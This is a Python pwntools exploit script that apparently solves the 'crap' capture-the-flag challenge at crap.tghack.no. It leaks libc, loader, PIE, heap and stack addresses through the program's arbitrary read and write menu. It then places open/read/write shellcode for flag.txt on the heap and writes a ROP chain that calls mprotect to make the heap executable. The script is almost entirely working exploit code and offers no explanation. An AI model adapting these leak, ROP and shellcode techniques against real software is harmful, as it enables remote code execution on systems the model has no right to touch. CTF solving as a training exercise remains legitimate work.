from pwn import *

bin = ELF('./crap')
ld = ELF('./ld-2.31.so')
libc = ELF('./libc.so.6')
context(arch='amd64')

p = remote("crap.tghack.no", 6001)

def wait():
 p.recvrepeat(0.3)

def view(address):
 p.sendline('1')
 wait()
 p.sendline(hex(address))

def write(address, value):
 p.sendline('2')
 wait()
 p.sendline(hex(address) + ' ' + value)
 wait()

def viewf():
 p.sendline('4')

def writef(data, freestuff):
 p.sendline('3')
 wait()
 p.sendline(data)
 wait()
 p.sendline(freestuff)
 wait()

writef('test', 'n')
viewf()
temp = p.recvline()
libcleak = u64(temp.split(': ')[1].split('\n')[0].ljust(8, '\x00'))
libc.address = libcleak - 0x3b5be0
log.info("main arena leak: " + hex(libcleak))
log.info("libc base: " + hex(libc.address))
ld.address = 6250496+(0x1000*12)+libc.address
log.info("ld base: " + hex(ld.address))
view(ld.symbols['_dl_rtld_libname'])
temp = p.recvline()
pieleak= int(temp.split(': ')[1].split('\n')[0], 16)
bin.address = pieleak - 2109440 + 2108872
log.info("pie base: " + hex(bin.address))
write(bin.address + 0x202030, "0xffffffa8ffffffa8")
view(libcleak)
temp = p.recvline()
heapleak = int(temp.split(': ')[1].split('\n')[0], 16)
log.info("heap leak: " + hex(heapleak))
view(libc.symbols['environ'])
temp = p.recvline()
stackleak = int(temp.split(': ')[1].split('\n')[0], 16)
log.info("stack leak: " + hex(stackleak))

write(bin.address+0x202038, "0x0")


s64 = shellcraft.amd64.close(0)
s64 += shellcraft.amd64.open('flag.txt')
s64 += shellcraft.amd64.linux.syscall("SYS_read", 0, "rsp", 0xff)
s64 += shellcraft.amd64.linux.syscall("SYS_write", 1, "rsp", 0x50)
s64 += shellcraft.amd64.linux.syscall("SYS_exit_group", 0)
shellcode = asm(s64)

writef(shellcode, 'y')
targetreturn = stackleak - 288
log.info("general target to overwrite: " + hex(targetreturn))
#libc gadgets
poprdi = libc.address + 0x0000000000021882 #: pop rdi; ret;
poprsi = libc.address + 0x0000000000022192 #: pop rsi; ret;
poprdx = libc.address + 0x0000000000001b9a #: pop rdx; ret;
poprsir15 = libc.address + 0x0000000000021880 #: pop rsi; pop r15; ret;

targetheap = heapleak-4704
write(targetreturn+64, hex(targetheap))
write(targetreturn+56, hex(libc.symbols['mprotect']))
write(targetreturn+48, hex(7))
write(targetreturn+40, hex(poprdx))
write(targetreturn+32, hex((heapleak-0x2000)>>12<<12))
write(targetreturn+24, hex(poprdi))
write(targetreturn+16, "0xdeadbabe")
write(targetreturn+8, "0x12000")
context.log_level = 'debug'
write(targetreturn, hex(poprsir15))
p.close()